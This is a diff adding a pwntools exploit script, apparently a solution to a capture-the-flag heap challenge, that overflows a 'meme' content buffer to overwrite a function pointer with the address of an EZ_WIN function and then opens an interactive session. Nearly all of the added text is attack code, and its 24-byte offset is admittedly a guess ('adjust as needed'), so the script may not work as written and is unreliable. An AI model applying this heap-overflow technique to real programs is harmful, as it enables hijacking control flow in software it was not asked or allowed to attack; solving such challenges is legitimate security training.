@@ -85,3 +85,66 @@
  'layout. You may need to experiment with the `offset` value to correctly '
  'overwrite the function pointer. Additionally, ensure that the target binary '
  'path and any remote connections are correctly configured.')
+
+from pwn import *
+
+# Set up pwntools for the target binary
+exe = './pwn/heap/heap-2/heap2'
+
+# Start the process (adjust 'env' and 'aslr' if necessary)
+p = process(exe)
+
+# For remote exploitation, uncomment the following line and adjust the IP and port
+# p = remote('target_ip', target_port)
+
+# Load the binary
+elf = ELF(exe)
+
+# Find the address of the EZ_WIN function
+ez_win = elf.symbols['EZ_WIN']
+log.info(f"Address of EZ_WIN: {hex(ez_win)}")
+
+# Function to create a new meme
+def new_meme(size, content):
+    p.sendlineafter(b'choice!\n', b'1')
+    p.sendlineafter(b'Enter meme size: ', str(size).encode())
+    p.sendlineafter(b'Enter meme content: ', content)
+    p.recvuntil(b'Done!\n')
+
+# Function to edit an existing meme
+def edit_meme(index, content):
+    p.sendlineafter(b'choice!\n', b'2')
+    p.sendlineafter(b'Index: ', str(index).encode())
+    p.sendlineafter(b'Enter meme content: ', content)
+    p.recvuntil(b'Done!\n')
+
+# Function to print a meme (triggers the function pointer)
+def print_meme(index):
+    p.sendlineafter(b'choice!\n', b'3')
+    p.sendlineafter(b'Index: ', str(index).encode())
+
+# Create a new meme with a small content size
+meme_size = 16
+new_meme(meme_size, b'A' * (meme_size - 1))
+
+# Calculate the overflow length to reach the function pointer
+# Since the meme structure is likely laid out as:
+# [Function Pointer (8 bytes)][Content Pointer (8 bytes)]
+# And the content buffer is separate, we need to overflow the content buffer
+# and overwrite the function pointer in the meme structure.
+# We'll assume an offset of 24 bytes for this example (adjust as needed).
+
+offset = 24  # Adjust this value based on analysis
+
+# Build the payload to overwrite the function pointer with the address of EZ_WIN
+payload = b'A' * offset
+payload += p64(ez_win)
+
+# Edit the meme to overflow the buffer and overwrite the function pointer
+edit_meme(0, payload)
+
+# Trigger the overwritten function pointer
+print_meme(0)
+
+# Interact with the shell
+p.interactive()
